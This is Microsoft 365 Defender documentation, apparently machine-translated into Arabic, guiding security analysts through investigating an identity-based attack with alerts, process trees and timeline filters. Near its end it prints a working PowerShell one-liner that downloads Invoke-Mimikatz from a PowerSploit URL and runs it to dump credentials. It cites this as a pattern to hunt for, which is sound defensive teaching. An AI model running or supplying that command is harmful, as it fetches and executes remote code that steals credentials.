---
title: مثال على هجوم قائم على الهوية
description: تقدم في تحليل مثال للهجوم المستند إلى الهوية.
keywords: الحوادث، والتنبيهات، والتحقيق، والارتباط، والهجمات، والآلات، والأجهزة، والمستخدمين، والهويات، والهوية، وعلبة البريد، والبريد الإلكتروني، و365، وmicrosoft، وm365، والاستجابة للحوادث، والهجمات الإلكترونية
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: dansimp
author: dansimp
ms.localizationpriority: medium
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365solution-firstincident
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 2e0b237ad045b98b2bb013399f344db3f20f1919
ms.sourcegitcommit: c1eaea74c8ffce2f9f477c9469342e88e4a70c14
ms.translationtype: MT
ms.contentlocale: ar-SA
ms.lasthandoff: 07/20/2022
ms.locfileid: "66893606"
---
# <a name="example-of-an-identity-based-attack"></a>مثال على هجوم قائم على الهوية

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**ينطبق على:**
- Microsoft 365 Defender

يمكن أن تساعد Microsoft Defender for Identity في الكشف عن المحاولات الضارة لخرق الهويات في مؤسستك. نظرا لأن Defender for Identity يتكامل مع Microsoft 365 Defender، يمكن أن يكون لدى محللي الأمان رؤية على التهديدات الواردة من Defender for Identity، مثل محاولات رفع امتياز Netlogon المشتبه بها.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>تحليل الهجوم في Microsoft Defender for Identity

يسمح Microsoft 365 Defender للمحللين بتصفية التنبيهات عن طريق مصدر الكشف في علامة التبويب **«Alerts**» في صفحة «incidents». في المثال التالي، تتم تصفية مصدر الكشف إلى **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="تصفية مصدر الكشف في Microsoft Defender for Identity" lightbox="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png":::

يؤدي تحديد التنبيه **الهجومي المشكوك به فوقpass-the-hash** إلى صفحة في Microsoft Defender for Cloud Apps تعرض معلومات أكثر تفصيلا. يمكنك دائما معرفة المزيد حول التنبيه أو الهجوم عن طريق تحديد **معرفة المزيد حول نوع التنبيه هذا** لقراءة [وصف للهجوم](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) واقتراحات المعالجة.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="تنبيه هجوم زائد مشتبه به" lightbox="../../media/first-incident-path-identity/first-incident-identity-alert-example.png"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>التحقيق في الهجوم نفسه في Microsoft Defender لنقطة النهاية

بدلا من ذلك، يمكن للمحلل استخدام Defender لنقطة النهاية لمعرفة المزيد حول النشاط على نقطة النهاية. حدد الحدث من قائمة انتظار الحدث، ثم حدد علامة التبويب **«Alerts** ». من هنا، يمكنهم تحديد مصدر الكشف أيضا. يشير مصدر الكشف المسمى باسم EDR إلى الكشف عن نقطة النهاية والاستجابة لها، وهو Defender لنقطة النهاية. من هنا، يختار المحلل تنبيها تم اكتشافه بواسطة EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="الكشف عن نقطة النهاية والاستجابة لها في مدخل Microsoft Defender لنقطة النهاية" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png":::

تعرض صفحة التنبيه معلومات مختلفة ذات صلة مثل اسم الجهاز المتأثر واسم المستخدم وحالة التحقيق التلقائي وتفاصيل التنبيه. تصور قصة التنبيه تمثيلا مرئيا لشجرة العملية. شجرة العملية هي تمثيل هرمي للعمليات الأصل والتابعة المتعلقة بالتنبيه.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="شجرة عملية تنبيه في Microsoft Defender لنقطة النهاية" lightbox="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png"::: 

يمكن توسيع كل عملية لعرض المزيد من التفاصيل. التفاصيل التي يمكن للمحلل رؤيتها هي الأوامر الفعلية التي تم إدخالها كجزء من برنامج نصي ضار وعناوين IP للاتصال الخارجي ومعلومات أخرى مفيدة.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="تفاصيل العملية في مدخل Microsoft Defender لنقطة النهاية" lightbox="../../media/first-incident-path-identity/first-incident-identity-process-details.png":::
 
من خلال تحديد **"انظر" في المخطط الزمني**، يمكن للمحلل التعمق أكثر لتحديد الوقت المحدد للاختراق. 

يمكن Microsoft Defender لنقطة النهاية الكشف عن العديد من الملفات والبرامج النصية الضارة. ومع ذلك، نظرا إلى العديد من الاستخدامات المشروعة للاتصالات الصادرة، وPowerShell، ونشاط سطر الأوامر، فإن بعض النشاط يعتبر ضارا حتى يقوم بإنشاء ملف أو نشاط ضار. لذلك، يساعد استخدام المخطط الزمني المحللين على وضع التنبيه في سياق مع النشاط المحيط لتحديد المصدر الأصلي أو الوقت الأصلي للهجوم الذي يتم حجبه بخلاف ذلك بواسطة نظام الملفات المشترك ونشاط المستخدم. 

لاستخدام المخطط الزمني، سيبدأ المحلل في وقت الكشف عن التنبيه (باللون الأحمر) ويمرر لأسفل إلى الخلف في الوقت المناسب لتحديد وقت بدء النشاط الأصلي الذي أدى إلى النشاط الضار بالفعل. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="وقت بدء المحلل للكشف عن التنبيه" lightbox="../../media/first-incident-path-identity/first-incident-identity-start-time.png"::: 

من المهم فهم النشاط الشائع وتمييزه مثل اتصالات Windows Update، وحركة مرور تنشيط Windows Trusted Software، والاتصالات الشائعة الأخرى لمواقع Microsoft، ونشاط الإنترنت لجهة خارجية، ونشاط نقطة النهاية من Microsoft Configuration Manager، وغيرها من الأنشطة غير الضارة من النشاط المشبوه. إحدى طرق التمييز هي استخدام عوامل تصفية المخطط الزمني. هناك العديد من عوامل التصفية التي يمكنها تمييز نشاط معين مع تصفية أي شيء لا يريد المحلل عرضه. 

في الصورة أدناه، تمت تصفية المحلل لعرض أحداث الشبكة ومعالجتها فقط. تسمح معايير التصفية هذه للمحلل برؤية اتصالات الشبكة والعمليات المحيطة بالحدث حيث أنشأت المفكرة اتصالا بعنوان IP، والذي رأيناه أيضا في شجرة العمليات. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="كيفية استخدام المفكرة لإجراء اتصال خارجي ضار" lightbox="../../media/first-incident-path-identity/first-incident-identity-notepad.png"::: 

في هذا الحدث المحدد، تم استخدام المفكرة لإجراء اتصال صادر ضار. ومع ذلك، غالبا ما يستخدم المهاجمون iexplorer.exe لإنشاء اتصالات لتنزيل حمولة ضارة لأن عمليات iexplorer.exe عادة ما تعتبر نشاط مستعرض ويب عاديا.

عنصر آخر للبحث عنه في المخطط الزمني هو استخدام PowerShell للاتصالات الصادرة. سيبحث المحلل عن اتصالات PowerShell الناجحة مع أوامر مثل `IEX (New-Object Net.Webclient)` متبوعة باتصال صادر بموقع ويب يستضيف ملفا ضارا. 

في المثال التالي، تم استخدام PowerShell لتنزيل Mimikatz وتنفيذه من موقع ويب:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
يمكن للمحلل البحث بسرعة عن الكلمات الأساسية عن طريق كتابة الكلمة الأساسية في شريط البحث لعرض الأحداث التي تم إنشاؤها باستخدام PowerShell فقط. 

## <a name="next-step"></a>الخطوة التالية

راجع مسار التحقيق [في التصيد الاحتيالي](first-incident-path-phishing.md) .

## <a name="see-also"></a>راجع أيضًا

- [نظرة عامة على الحوادث](incidents-overview.md)
- [إدارة الأحداث](manage-incidents.md)
- [التحقيق في الأحداث](investigate-incidents.md)
